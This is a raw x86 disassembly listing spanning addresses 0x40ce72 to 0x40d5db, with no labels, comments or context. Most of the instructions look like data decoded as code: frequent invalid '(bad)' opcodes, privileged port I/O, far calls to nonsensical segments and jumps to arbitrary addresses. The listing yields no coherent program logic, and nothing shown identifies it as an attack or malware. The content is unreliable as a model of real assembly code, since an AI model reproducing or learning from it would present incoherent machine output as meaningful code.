  40ce72:	add    al,BYTE PTR [eax-0x54dd7ecf]
  40ce78:	nop
  40ce79:	sbb    bh,BYTE PTR [esi+0x26]
  40ce7c:	mov    WORD PTR [ebx-0x80],fs
  40ce7f:	inc    edi
  40ce80:	dec    esp
  40ce81:	push   edx
  40ce82:	dec    esp
  40ce83:	jb     0x40ce74
  40ce85:	jg     0x40ce3c
  40ce87:	popf   
  40ce88:	push   0x36
  40ce8a:	xor    cl,BYTE PTR [ecx+0x2f]
  40ce8d:	xor    DWORD PTR [ebx+0x2e24efd5],edi
  40ce93:	dec    ebx
  40ce94:	add    ecx,DWORD PTR ds:0x75df7457
  40ce9a:	outs   dx,DWORD PTR ds:[esi]
  40ce9b:	pop    edi
  40ce9c:	in     eax,dx
  40ce9d:	aam    0x94
  40ce9f:	add    al,0xcd
  40cea1:	push   ss
  40cea2:	aas    
  40cea3:	jecxz  0x40ce77
  40cea5:	je     0x40ce28
  40cea7:	popf   
  40cea8:	mov    eax,ds:0xcf27380a
  40cead:	xlat   BYTE PTR ds:[ebx]
  40ceae:	ret    0x7008
  40ceb1:	imul   ebp,DWORD PTR [esi-0x7b],0x74928449
  40ceb8:	xchg   ebp,eax
  40ceb9:	add    DWORD PTR [ecx-0x73],esp
  40cebc:	jmp    0x40ced7
  40cebe:	(bad)  
  40cebf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cec0:	mul    DWORD PTR [esi-0x796775c6]
  40cec6:	stos   BYTE PTR es:[edi],al
  40cec7:	xchg   BYTE PTR [esi+0x7],ah
  40ceca:	mov    dl,0x6c
  40cecc:	cli    
  40cecd:	cdq    
  40cece:	cmp    al,0x1c
  40ced0:	clc    
  40ced1:	xlat   BYTE PTR ds:[ebx]
  40ced2:	enter  0xd8fd,0xae
  40ced6:	or     dl,0x5f
  40ced9:	aas    
  40ceda:	mov    edx,0xe7462ed3
  40cedf:	and    al,0xb3
  40cee1:	aad    0x45
  40cee3:	push   0xd9f975a3
  40cee8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cee9:	shr    DWORD PTR [ebp-0x49b0e971],1
  40ceef:	push   ecx
  40cef0:	cli    
  40cef1:	mov    ?,WORD PTR [edx-0x6c2f414]
  40cef7:	sahf   
  40cef8:	adc    ecx,esi
  40cefa:	sbb    eax,0xefba0203
  40ceff:	adc    al,0xe6
  40cf01:	jb     0x40cef4
  40cf03:	test   DWORD PTR [edi+eiz*4+0x6ac2070b],edi
  40cf0a:	mov    dl,0xec
  40cf0c:	cwde   
  40cf0d:	and    esp,ebx
  40cf0f:	cmp    eax,0x655738e1
  40cf14:	in     eax,dx
  40cf15:	ficom  DWORD PTR [ecx+0x5f]
  40cf18:	scas   eax,DWORD PTR es:[edi]
  40cf19:	jno    0x40ceb9
  40cf1b:	sbb    ebx,DWORD PTR [esp+ecx*1-0x14]
  40cf1f:	cmp    dl,BYTE PTR [edx]
  40cf21:	xor    BYTE PTR [esi-0xb7f7e98],ch
  40cf27:	jnp    0x40cf40
  40cf29:	adc    ebp,ebp
  40cf2b:	and    DWORD PTR [eax+eax*4],ebx
  40cf2e:	mov    esp,0x49d4375c
  40cf33:	push   edx
  40cf34:	or     DWORD PTR ds:0x5ecd2338,ebp
  40cf3a:	mov    DWORD PTR [ebp+0xd],ebp
  40cf3d:	stos   BYTE PTR es:[edi],al
  40cf3e:	cld    
  40cf3f:	jp     0x40cf59
  40cf41:	repz out dx,al
  40cf43:	adc    DWORD PTR [edi],0x6d
  40cf46:	xchg   edx,eax
  40cf47:	sub    BYTE PTR [ebp-0xcb0693b],bh
  40cf4d:	adc    al,BYTE PTR [edi+0x28eb37b3]
  40cf53:	mov    cl,0xb1
  40cf55:	sahf   
  40cf56:	pop    edx
  40cf57:	fidiv  DWORD PTR ds:0x34090aca
  40cf5d:	and    ecx,DWORD PTR [eax]
  40cf5f:	or     DWORD PTR [esi+0x388b803],ebp
  40cf65:	push   eax
  40cf66:	mov    cl,0x1
  40cf68:	fldcw  WORD PTR [ecx+0x7e33063a]
  40cf6e:	fisubr WORD PTR [eax]
  40cf71:	dec    eax
  40cf72:	sub    eax,0xa881b9f2
  40cf77:	xor    cl,BYTE PTR [eax]
  40cf79:	fdivrp st(5),st
  40cf7b:	(bad)  
  40cf7d:	mov    bh,ch
  40cf7f:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40cf81:	or     dh,BYTE PTR [edx]
  40cf83:	bound  esp,QWORD PTR [eax]
  40cf85:	dec    ecx
  40cf86:	jo     0x40cf28
  40cf88:	sub    ecx,DWORD PTR [esi+0x57]
  40cf8b:	cmp    edx,0xf2d467d3
  40cf91:	jb     0x40cf7a
  40cf93:	test   BYTE PTR [esi+0x1d],al
  40cf96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf97:	call   0xf7db07ca
  40cf9c:	mov    edx,0xf89eca06
  40cfa1:	push   sp
  40cfa3:	iret   
  40cfa4:	je     0x40cfd4
  40cfa6:	jmp    0xf41e:0xff4a525b
  40cfad:	jl     0x40cfbd
  40cfaf:	nop
  40cfb0:	sub    BYTE PTR [eax-0x6b403ae3],ah
  40cfb6:	js     0x40cf7a
  40cfb8:	xlat   BYTE PTR ds:[ebx]
  40cfb9:	xchg   esi,eax
  40cfba:	mov    al,ds:0x4a83a075
  40cfbf:	mul    DWORD PTR [esi+0x62]
  40cfc2:	jmp    0x40d03a
  40cfc4:	rol    BYTE PTR [ecx-0xa2036f8],0x3e
  40cfcb:	jl     0x40cff8
  40cfcd:	jns    0x40cf93
  40cfcf:	mov    edi,DWORD PTR [edi+0x4d892516]
  40cfd5:	inc    ebx
  40cfd6:	inc    ebx
  40cfd7:	push   esp
  40cfd8:	adc    ah,dl
  40cfda:	repnz pop ss
  40cfdc:	call   0x63dc:0xe7f77745
  40cfe3:	loope  0x40cf9a
  40cfe5:	sbb    cl,al
  40cfe7:	int3   
  40cfe8:	cmp    DWORD PTR [edx+edi*1+0x6152c4de],0x426c0b61
  40cff3:	inc    edi
  40cff4:	das    
  40cff5:	or     esp,DWORD PTR [edx]
  40cff7:	aam    0x4d
  40cff9:	imul   ebp,DWORD PTR [ebx],0x1e7a46b2
  40cfff:	mov    ah,0xad
  40d001:	into   
  40d002:	or     cl,bh
  40d004:	xor    DWORD PTR ds:0xdfeda6dd,ebp
  40d00a:	jbe    0x40d02a
  40d00c:	adc    ah,ch
  40d00e:	push   esp
  40d00f:	pop    ds
  40d010:	jne    0x40d049
  40d012:	in     al,0x9c
  40d014:	ss xchg esp,eax
  40d016:	pop    ds
  40d017:	sub    al,0xc7
  40d019:	or     ecx,DWORD PTR [eax+ecx*4]
  40d01c:	mov    esp,0x1fc714d6
  40d021:	mov    cl,BYTE PTR [esi-0x4e7b35ec]
  40d027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d028:	push   edi
  40d029:	jne    0x40d009
  40d02b:	ss push esp
  40d02d:	pop    edi
  40d02e:	in     eax,0x8c
  40d030:	mov    ecx,0x6966905f
  40d035:	retf   
  40d036:	fst    DWORD PTR [eax-0x78979a1a]
  40d03c:	or     al,0xca
  40d03e:	jb     0x40cff8
  40d040:	pop    ebp
  40d041:	dec    esp
  40d042:	(bad)  
  40d044:	out    0x42,al
  40d046:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d048:	xchg   edx,eax
  40d049:	and    DWORD PTR [ebx+ebx*2-0x260d6632],esi
  40d050:	cmp    eax,0x23f17118
  40d055:	(bad)  
  40d056:	mov    dh,0x32
  40d058:	iret   
  40d059:	aad    0x97
  40d05b:	test   eax,0x5759772a
  40d060:	out    dx,eax
  40d061:	mov    cl,0x55
  40d063:	es aas 
  40d065:	aad    0xda
  40d067:	and    edi,DWORD PTR [esi+0x1d12331c]
  40d06d:	es repz loope 0x40d0e5
  40d071:	inc    edi
  40d072:	sub    BYTE PTR [ebp-0x22847d28],bl
  40d078:	call   0x46ba:0xb651d12d
  40d07f:	add    ch,al
  40d081:	xchg   ebp,eax
  40d082:	and    BYTE PTR [ecx-0x763f67a7],ch
  40d088:	into   
  40d089:	xor    BYTE PTR [eax+0x0],al
  40d08c:	mov    al,ds:0x75a066d7
  40d091:	adc    eax,0x30ca2f91
  40d096:	push   cs
  40d097:	gs pop si
  40d09a:	inc    BYTE PTR [edx]
  40d09c:	xchg   cl,bh
  40d09e:	xor    al,BYTE PTR [edi]
  40d0a0:	popf   
  40d0a1:	pop    esi
  40d0a2:	adc    esi,DWORD PTR [ecx]
  40d0a4:	mov    cl,0xb8
  40d0a6:	or     BYTE PTR ds:0x91496301,0xb0
  40d0ad:	cs iret 
  40d0af:	aam    0x69
  40d0b1:	imul   esi,DWORD PTR [edi+0x5692cc3b],0xffffffc5
  40d0b8:	push   cs
  40d0b9:	fucomi st,st(1)
  40d0bb:	call   0xc618:0x2122ce64
  40d0c2:	xor    esi,DWORD PTR [esi+esi*2+0x15da8a41]
  40d0c9:	sbb    DWORD PTR [ebx],edx
  40d0cb:	jg     0x40d097
  40d0cd:	mov    ecx,DWORD PTR [eax]
  40d0cf:	frstor [ebp-0x7]
  40d0d2:	pop    ecx
  40d0d3:	lods   eax,DWORD PTR ds:[esi]
  40d0d4:	setno  BYTE PTR [esi]
  40d0d7:	add    ah,ah
  40d0d9:	in     al,dx
  40d0da:	outs   dx,BYTE PTR ds:[esi]
  40d0db:	test   eax,0xe44d778
  40d0e0:	pop    eax
  40d0e1:	pop    edx
  40d0e2:	retf   0x8c37
  40d0e5:	mov    ebx,0x4ebf813b
  40d0ea:	in     eax,0x69
  40d0ec:	cli    
  40d0ed:	pop    eax
  40d0ee:	push   ecx
  40d0ef:	iret   
  40d0f0:	fsubr  st(6),st
  40d0f2:	ret    
  40d0f3:	jl     0x40d0af
  40d0f5:	call   0x876c:0xd5b3606a
  40d0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0fd:	push   esi
  40d0fe:	iret   
  40d0ff:	xchg   DWORD PTR ds:0x39263e,edi
  40d105:	xlat   BYTE PTR ds:[ebx]
  40d106:	das    
  40d107:	and    ecx,ebx
  40d109:	push   ecx
  40d10a:	shr    DWORD PTR [edi+0x4a0436f6],0x65
  40d111:	push   edx
  40d112:	repz mov cl,0xa1
  40d115:	shl    DWORD PTR [ecx-0x6c],1
  40d118:	sub    al,0xe1
  40d11a:	sbb    DWORD PTR [edx+ecx*8+0x3c7fb198],esi
  40d121:	or     eax,0x96083df8
  40d126:	mov    esp,0xe8dfb59d
  40d12b:	sbb    eax,0x55aade0d
  40d130:	dec    ecx
  40d131:	les    eax,FWORD PTR [ebx]
  40d133:	xchg   edx,eax
  40d134:	in     eax,dx
  40d135:	mov    bl,0x6f
  40d137:	xlat   BYTE PTR ds:[ebx]
  40d138:	arpl   WORD PTR [ebx-0x3c698caf],bp
  40d13e:	imul   esp,ebp,0x4b
  40d141:	jne    0x40d184
  40d143:	call   0x3498ce31
  40d148:	in     al,dx
  40d149:	popf   
  40d14a:	pop    ebx
  40d14b:	cwde   
  40d14c:	push   ebp
  40d14d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d14e:	stos   DWORD PTR es:[edi],eax
  40d14f:	fwait
  40d150:	inc    edi
  40d151:	mov    esi,0x75745d0d
  40d156:	sub    ah,BYTE PTR [ecx-0x23]
  40d159:	div    BYTE PTR [eax+0x7a]
  40d15c:	cmp    DWORD PTR [ebp-0x3e],esp
  40d15f:	sbb    al,0x37
  40d161:	jne    0x40d142
  40d163:	and    ebp,edx
  40d165:	fistp  WORD PTR [eax-0x5c]
  40d168:	clc    
  40d169:	mov    edx,0x186d5708
  40d16e:	mov    bl,0x50
  40d170:	or     DWORD PTR [edi],esp
  40d172:	int3   
  40d173:	push   cs
  40d174:	ins    DWORD PTR es:[edi],dx
  40d175:	cmc    
  40d176:	in     eax,0x24
  40d178:	mov    ch,0x91
  40d17a:	mov    ah,0x2
  40d17c:	mov    edi,0x9c6e7293
  40d181:	sbb    esp,eax
  40d183:	leave  
  40d184:	aad    0xb7
  40d186:	add    DWORD PTR [ecx+0x26],ecx
  40d189:	cmc    
  40d18a:	or     DWORD PTR [edi+0x7efc3823],edx
  40d190:	xchg   BYTE PTR [ebp+0x36],ch
  40d193:	cmp    BYTE PTR [edi+0x4380ff7d],bl
  40d199:	mov    ah,0xd8
  40d19b:	fs in  eax,0x5c
  40d19e:	xor    eax,0x3964bdf4
  40d1a3:	js     0x40d1ec
  40d1a5:	jle    0x40d15c
  40d1a7:	(bad)  
  40d1a8:	in     eax,0xb1
  40d1aa:	(bad)  
  40d1ac:	or     eax,0xe1d32f0d
  40d1b1:	sub    eax,0xf94c20a2
  40d1b6:	dec    ebx
  40d1b7:	jle    0x40d17e
  40d1b9:	in     eax,0x5a
  40d1bb:	and    edx,DWORD PTR [esi]
  40d1bd:	(bad)  
  40d1be:	pop    eax
  40d1bf:	ror    BYTE PTR [edx+0x4],cl
  40d1c2:	add    BYTE PTR [ebp-0x58b086f7],dh
  40d1c8:	dec    ecx
  40d1c9:	sub    al,0xd3
  40d1cb:	mov    eax,0xa25aacb6
  40d1d0:	sbb    BYTE PTR [esi+0x3ef18a65],0xa6
  40d1d7:	xchg   edx,eax
  40d1d8:	xchg   edi,eax
  40d1d9:	sbb    ch,BYTE PTR [esi+0x6e7a868f]
  40d1df:	pop    esi
  40d1e0:	fst    QWORD PTR [eax+0x473d55d]
  40d1e6:	in     al,dx
  40d1e7:	xchg   ebp,eax
  40d1e8:	ret    0xdea2
  40d1eb:	ret    
  40d1ec:	ss leave 
  40d1ee:	dec    edi
  40d1ef:	retf   
  40d1f0:	pop    edx
  40d1f1:	retf   
  40d1f2:	push   ss
  40d1f3:	fbld   TBYTE PTR ds:0x5c1fc86d
  40d1f9:	add    BYTE PTR [edi-0x205bd3ac],ah
  40d1ff:	jge    0x40d26e
  40d201:	mov    esp,DWORD PTR [esi-0x58997292]
  40d207:	ror    BYTE PTR [edx+0x25],1
  40d20a:	rcr    BYTE PTR cs:[ecx+0x4b],cl
  40d20e:	(bad)  
  40d20f:	mov    edx,0xc0f5d9a8
  40d214:	add    eax,0x1696bcb3
  40d219:	fwait
  40d21a:	inc    ecx
  40d21b:	or     al,0x47
  40d21d:	cs inc edi
  40d21f:	or     al,0x2e
  40d221:	or     al,0xe4
  40d223:	adc    BYTE PTR ds:[esi-0x2c60f6d4],dh
  40d22a:	push   ebp
  40d22b:	sbb    DWORD PTR [ecx+0x28889b60],edx
  40d231:	mov    dl,0xa2
  40d233:	neg    DWORD PTR [ecx+0x21]
  40d236:	pop    ss
  40d237:	in     al,0xa6
  40d239:	jge    0x40d1e9
  40d23b:	addr16 sbb eax,0x3c1b81bf
  40d241:	out    dx,al
  40d242:	test   DWORD PTR [ecx-0x6b],esi
  40d245:	push   eax
  40d246:	or     esi,ebx
  40d248:	sbb    edi,DWORD PTR [ecx]
  40d24a:	jg     0x40d27b
  40d24c:	gs jg  0x40d29e
  40d24f:	mov    esp,0xc257c4e
  40d254:	sub    BYTE PTR [eax-0x37cbc75e],0x14
  40d25b:	lock sbb ch,BYTE PTR [ecx]
  40d25e:	sub    ecx,ecx
  40d260:	dec    esp
  40d261:	jle    0x40d21d
  40d263:	pop    ebp
  40d264:	xor    ebp,edi
  40d266:	shr    DWORD PTR [ebx+edx*2+0xb],1
  40d26a:	dec    ecx
  40d26b:	or     ch,bh
  40d26d:	push   cs
  40d26e:	iret   
  40d26f:	push   es
  40d270:	pop    edi
  40d271:	loop   0x40d22e
  40d273:	out    0x8c,eax
  40d275:	std    
  40d276:	sub    eax,0x638d5328
  40d27b:	out    dx,al
  40d27c:	jae    0x40d24e
  40d27e:	mov    ecx,0xf8b56a03
  40d283:	loopne 0x40d234
  40d285:	mov    WORD PTR [edi-0x5e97e91c],?
  40d28b:	lahf   
  40d28c:	pop    edi
  40d28d:	stos   BYTE PTR es:[edi],al
  40d28e:	outs   dx,BYTE PTR ds:[esi]
  40d28f:	dec    ecx
  40d290:	dec    edx
  40d291:	mov    esi,esi
  40d293:	and    cl,BYTE PTR [ecx-0x2e]
  40d296:	push   es
  40d297:	mov    ah,0x2d
  40d299:	cmp    al,0x33
  40d29b:	xor    ecx,edx
  40d29d:	pop    ecx
  40d29e:	hlt    
  40d29f:	push   es
  40d2a0:	stos   BYTE PTR es:[edi],al
  40d2a1:	xor    al,0xde
  40d2a3:	fist   WORD PTR [eax]
  40d2a5:	mov    edx,0x6f03177a
  40d2aa:	das    
  40d2ab:	sub    al,bl
  40d2ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2ae:	stos   BYTE PTR es:[edi],al
  40d2af:	stos   DWORD PTR es:[edi],eax
  40d2b0:	in     eax,0x9d
  40d2b2:	aas    
  40d2b3:	and    bl,ch
  40d2b5:	rcl    BYTE PTR [eax],1
  40d2b7:	ret    0xc401
  40d2ba:	dec    edx
  40d2bb:	leave  
  40d2bc:	mov    ecx,0x235ad2a7
  40d2c1:	inc    ebp
  40d2c2:	dec    ebx
  40d2c3:	imul   eax,esi,0x24fd71f5
  40d2c9:	inc    DWORD PTR [ebp-0x5be62508]
  40d2cf:	mov    dl,0xf5
  40d2d1:	retf   0xed32
  40d2d4:	sbb    DWORD PTR [edi+0x52ae29c3],ebp
  40d2da:	stos   BYTE PTR es:[edi],al
  40d2db:	inc    ecx
  40d2dc:	jmp    0xa42c7b44
  40d2e1:	dec    eax
  40d2e2:	jmp    0x40d2c1
  40d2e4:	adc    edx,DWORD PTR [esi-0x1]
  40d2e7:	adc    al,0x64
  40d2e9:	out    0x48,al
  40d2eb:	clc    
  40d2ec:	idiv   DWORD PTR [eax]
  40d2ee:	push   DWORD PTR [edi+0x4a1bb065]
  40d2f4:	bound  esi,QWORD PTR [esi]
  40d2f6:	add    edi,ebp
  40d2f8:	pushf  
  40d2f9:	jecxz  0x40d35e
  40d2fb:	push   eax
  40d2fc:	pop    ecx
  40d2fd:	and    BYTE PTR [esi],ah
  40d2ff:	fsub   DWORD PTR [edi-0x1a]
  40d302:	mov    dl,0x93
  40d304:	fild   QWORD PTR [eax+0x270067a5]
  40d30a:	cmp    esp,DWORD PTR [ecx]
  40d30c:	std    
  40d30d:	iret   
  40d30e:	xchg   esp,eax
  40d30f:	(bad)  
  40d310:	into   
  40d311:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d312:	pop    ecx
  40d313:	out    dx,al
  40d314:	sub    BYTE PTR [ebx],dl
  40d316:	out    dx,eax
  40d317:	adc    al,0x6e
  40d319:	sbb    BYTE PTR [ecx+0x23],ah
  40d31c:	adc    ah,BYTE PTR [esi+0x6b]
  40d31f:	cli    
  40d320:	lahf   
  40d321:	repz xchg esi,eax
  40d323:	pusha  
  40d324:	das    
  40d325:	aas    
  40d326:	cmp    edx,DWORD PTR ss:[esi]
  40d329:	cmp    eax,0xdf6a78d0
  40d32e:	rcr    DWORD PTR [esi+eiz*8+0x1e],0xaa
  40d333:	cmp    ah,dl
  40d335:	scas   al,BYTE PTR es:[edi]
  40d336:	jnp    0x40d2c9
  40d338:	mov    ah,0x4
  40d33a:	fldcw  WORD PTR [edi]
  40d33c:	aaa    
  40d33d:	mov    ebx,0x698bfb01
  40d342:	or     eax,0xd8bee4
  40d347:	loopne 0x40d2ca
  40d349:	inc    ecx
  40d34a:	(bad)  
  40d34c:	in     eax,0x20
  40d34e:	and    al,0x33
  40d350:	inc    edx
  40d351:	bound  ebx,QWORD PTR [edi+0x5a]
  40d354:	mov    eax,ds:0x4f95f994
  40d359:	xlat   BYTE PTR ds:[ebx]
  40d35a:	mov    ecx,ebx
  40d35c:	in     eax,dx
  40d35d:	pop    ds
  40d35e:	out    0xf5,eax
  40d360:	sbb    al,0x92
  40d362:	or     al,0xd5
  40d364:	ret    
  40d365:	xchg   edx,eax
  40d366:	xor    al,0xa0
  40d368:	sub    BYTE PTR gs:[ebp-0x1f],dl
  40d36c:	(bad)  
  40d36d:	fwait
  40d36e:	xchg   ebp,eax
  40d36f:	xor    al,0x64
  40d371:	add    eax,0x7cf6ee6e
  40d376:	ret    0xfb29
  40d379:	loop   0x40d3e4
  40d37b:	sbb    eax,0xeaa0a245
  40d380:	lods   eax,DWORD PTR ds:[esi]
  40d381:	push   esi
  40d382:	loopne 0x40d37d
  40d384:	(bad)  
  40d385:	mov    ch,0x3c
  40d387:	shl    BYTE PTR [edi],0x53
  40d38a:	aad    0xc2
  40d38c:	stos   BYTE PTR es:[edi],al
  40d38d:	mov    ds:0xad4966d0,eax
  40d392:	xchg   DWORD PTR [esi],ecx
  40d394:	ins    BYTE PTR es:[edi],dx
  40d395:	pop    esp
  40d396:	jnp    0x40d3f0
  40d398:	call   0x8ab423a1
  40d39d:	add    eax,0xfc862bf9
  40d3a2:	jl     0x40d36b
  40d3a4:	mov    ecx,0xa87c4dc2
  40d3a9:	xchg   edx,eax
  40d3aa:	sbb    dh,bh
  40d3ac:	arpl   WORD PTR [edi],dx
  40d3ae:	cmp    bh,al
  40d3b0:	enter  0xc3c3,0x61
  40d3b4:	sub    al,0xcb
  40d3b6:	sub    BYTE PTR [edx+edx*8+0x2c0318a4],bh
  40d3bd:	enter  0xda40,0x6f
  40d3c1:	xor    al,0x86
  40d3c3:	xchg   BYTE PTR [edi],ch
  40d3c5:	das    
  40d3c6:	inc    edx
  40d3c7:	cli    
  40d3c8:	sti    
  40d3c9:	adc    al,0x1d
  40d3cb:	adc    DWORD PTR [eax-0x12],ebx
  40d3ce:	in     eax,dx
  40d3cf:	jle    0x40d412
  40d3d1:	jnp    0x40d3d8
  40d3d3:	scas   eax,DWORD PTR es:[edi]
  40d3d4:	dec    ebp
  40d3d6:	cmp    cl,BYTE PTR [ecx-0x1104cdf3]
  40d3dc:	cmp    eax,0xe30440f0
  40d3e1:	dec    ebp
  40d3e2:	xor    al,0x3
  40d3e4:	and    eax,0x443c8ac
  40d3e9:	jo     0x40d39b
  40d3eb:	mov    fs,WORD PTR [eax+0x75ac870d]
  40d3f1:	ins    BYTE PTR es:[edi],dx
  40d3f2:	inc    edi
  40d3f3:	push   eax
  40d3f4:	mov    dh,ch
  40d3f6:	pop    edi
  40d3f7:	mov    ds:0xac2c1adc,eax
  40d3fc:	icebp  
  40d3fd:	pop    ebx
  40d3fe:	mov    ds:0xf12ae3a2,al
  40d403:	push   esp
  40d404:	pushf  
  40d405:	and    dh,BYTE PTR [eax-0x19]
  40d408:	push   esi
  40d409:	test   dl,al
  40d40b:	or     DWORD PTR [edx+0x27],ebp
  40d40e:	or     eax,0x5766f65c
  40d413:	imul   BYTE PTR [edx+0x4795711d]
  40d419:	shl    BYTE PTR [eax+0x6a],1
  40d41c:	mov    ecx,0xb2db3517
  40d421:	lds    edi,FWORD PTR [edi+0x7f48cbcd]
  40d427:	clc    
  40d428:	sbb    BYTE PTR [ebx],cl
  40d42a:	repz adc BYTE PTR [esi],0x4
  40d42e:	add    ecx,DWORD PTR [esi]
  40d430:	push   0xffffffcb
  40d432:	xor    edi,esi
  40d434:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d435:	mov    eax,ds:0x80e3734
  40d43a:	mov    ch,0xb
  40d43c:	lods   eax,DWORD PTR ds:[esi]
  40d43d:	dec    edi
  40d43e:	mov    ds:0x2428d51a,al
  40d443:	xor    BYTE PTR [edx-0x4],0xe7
  40d447:	mov    esp,0x59c9cb3d
  40d44c:	cmp    eax,0xebefd1eb
  40d451:	imul   edx,DWORD PTR [ebp-0xa],0x1c
  40d455:	pop    ss
  40d456:	mov    BYTE PTR [ebp+ecx*1+0x6c],0x17
  40d45b:	jge    0x40d428
  40d45d:	or     eax,0xa0f9cb33
  40d462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d463:	sub    BYTE PTR [ebp+eax*8+0x65532bbe],cl
  40d46a:	sub    BYTE PTR [ebx-0x7dd2b5a5],0xd3
  40d471:	fild   DWORD PTR [eax-0x33fd0039]
  40d477:	lahf   
  40d478:	popf   
  40d479:	std    
  40d47a:	mov    edx,0x34d00b14
  40d47f:	call   0xe9a6:0xef7982e4
  40d486:	test   ax,0x347f
  40d48a:	mov    edi,0x103b235
  40d48f:	ffree  st(0)
  40d491:	call   DWORD PTR [eax-0x5d]
  40d494:	loopne 0x40d513
  40d496:	aas    
  40d497:	mov    WORD PTR [ebx+0x48bca8bb],ss
  40d49d:	push   edi
  40d49e:	mov    ebp,0x3c1eb284
  40d4a3:	mov    ds:0xac71dabc,eax
  40d4a8:	sub    bh,ch
  40d4aa:	xchg   DWORD PTR [ebx-0x7b],ebp
  40d4ad:	jno    0x40d4bd
  40d4af:	mov    esp,0xab4586d6
  40d4b4:	mov    ebp,DWORD PTR [ebp-0x36de7cf0]
  40d4ba:	push   esi
  40d4bb:	sub    DWORD PTR [ebx+eax*2+0xd],ecx
  40d4bf:	cmp    BYTE PTR [ecx],cl
  40d4c1:	and    BYTE PTR [esi+ecx*2-0x5ac8a07c],0x63
  40d4c9:	hlt    
  40d4ca:	pop    esi
  40d4cb:	dec    ebx
  40d4cc:	cmp    DWORD PTR [edx],eax
  40d4ce:	lods   al,BYTE PTR ds:[esi]
  40d4cf:	shl    BYTE PTR [ebp-0x66358dd1],1
  40d4d5:	jle    0x40d529
  40d4d7:	add    DWORD PTR [eax-0x5],edx
  40d4da:	mov    ecx,0xf1ff74f7
  40d4df:	dec    esp
  40d4e0:	scas   eax,DWORD PTR es:[edi]
  40d4e1:	mov    esi,0xc2685847
  40d4e6:	lods   al,BYTE PTR ds:[esi]
  40d4e7:	push   edx
  40d4e8:	loop   0x40d54c
  40d4ea:	(bad)  
  40d4eb:	jne    0x40d4b6
  40d4ed:	ds (bad) 
  40d4ef:	dec    edi
  40d4f0:	sbb    BYTE PTR [eax-0x455aeb2e],dl
  40d4f6:	dec    ebx
  40d4f7:	xchg   ebp,eax
  40d4f8:	push   ebx
  40d4f9:	jo     0x40d48f
  40d4fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d4fc:	cmp    esp,0xfffffff5
  40d4ff:	xchg   ebx,eax
  40d500:	int    0x2b
  40d502:	in     al,dx
  40d503:	fwait
  40d504:	push   eax
  40d505:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d506:	outs   dx,DWORD PTR ds:[esi]
  40d507:	sbb    edi,DWORD PTR [ebx]
  40d509:	jae    0x40d536
  40d50b:	test   DWORD PTR [eax-0x2b],0x30fc8846
  40d512:	and    ebx,esp
  40d514:	push   ebx
  40d515:	cmp    al,0x5b
  40d517:	in     eax,0x54
  40d519:	cmp    al,0xb0
  40d51b:	adc    eax,0x84afc7c6
  40d520:	int3   
  40d521:	sbb    al,0xf1
  40d523:	icebp  
  40d524:	inc    ebx
  40d525:	out    0xe,al
  40d527:	leave  
  40d528:	mov    bl,0x69
  40d52a:	push   ds
  40d52b:	jno    0x40d594
  40d52d:	cmp    BYTE PTR [ebp-0x47],0x75
  40d531:	push   ds
  40d532:	ror    BYTE PTR [edx-0x4b],1
  40d535:	bound  esp,QWORD PTR [esi-0x48]
  40d538:	retf   0xd5e7
  40d53b:	jno    0x40d502
  40d53d:	push   cs
  40d53e:	pop    ebp
  40d53f:	adc    ebx,DWORD PTR [eax-0xa]
  40d542:	test   al,0x8d
  40d544:	inc    ecx
  40d545:	mov    ebx,0x91ae31d6
  40d54a:	ret    0x1293
  40d54d:	call   DWORD PTR [edi+0x3d51828e]
  40d553:	xchg   ebx,eax
  40d554:	cld    
  40d555:	retf   0x15d
  40d558:	das    
  40d559:	mov    ebp,DWORD PTR ds:0x45491dbf
  40d55f:	xor    ecx,DWORD PTR [edi+0x1e71b368]
  40d565:	inc    ebp
  40d566:	call   DWORD PTR [edx]
  40d568:	shl    DWORD PTR [ebp+0x3],cl
  40d56b:	mov    bl,0xa5
  40d56d:	ins    BYTE PTR es:[edi],dx
  40d56e:	mov    ds,WORD PTR gs:[ecx-0x3f]
  40d572:	pop    ecx
  40d573:	mov    ah,0x9e
  40d575:	cld    
  40d576:	std    
  40d577:	or     BYTE PTR [eax],dl
  40d579:	je     0x40d51a
  40d57b:	out    0x7f,al
  40d57d:	les    esi,FWORD PTR [ebp+0x60c52942]
  40d583:	aas    
  40d584:	xor    DWORD PTR [ecx-0x1ac05a77],esi
  40d58a:	jle    0x40d56a
  40d58c:	push   ebx
  40d58d:	push   ds
  40d58e:	cmp    ecx,ecx
  40d590:	pop    es
  40d591:	je     0x40d552
  40d593:	push   ebx
  40d594:	cwde   
  40d595:	xchg   esp,eax
  40d596:	sbb    DWORD PTR [ebx-0x32],0x61bb66c8
  40d59d:	loopne 0x40d57b
  40d59f:	cmp    al,dh
  40d5a1:	(bad)  
  40d5a2:	in     al,dx
  40d5a3:	aaa    
  40d5a4:	in     al,0xd1
  40d5a6:	lea    edi,[esi]
  40d5a8:	mov    ds:0x8f6af05a,al
  40d5ad:	adc    dh,BYTE PTR [esi-0x54]
  40d5b0:	mov    gs,WORD PTR [edi+0x5c]
  40d5b3:	shl    DWORD PTR [edx],0xcf
  40d5b6:	add    eax,0x46103985
  40d5bb:	sbb    esi,DWORD PTR [ecx-0x78]
  40d5be:	xchg   BYTE PTR [ecx+eiz*1-0x22c53764],al
  40d5c5:	sbb    ecx,DWORD PTR [eax]
  40d5c7:	repz popf 
  40d5c9:	xchg   edi,eax
  40d5ca:	loope  0x40d637
  40d5cc:	loope  0x40d566
  40d5ce:	adc    BYTE PTR [esi],dl
  40d5d0:	and    al,0xfd
  40d5d2:	push   edi
  40d5d3:	push   ecx
  40d5d4:	jmp    0x7d653f99
  40d5d9:	or     al,0xea
  40d5db:	arpl   WORD PTR [ebp-0x284b2e33],di
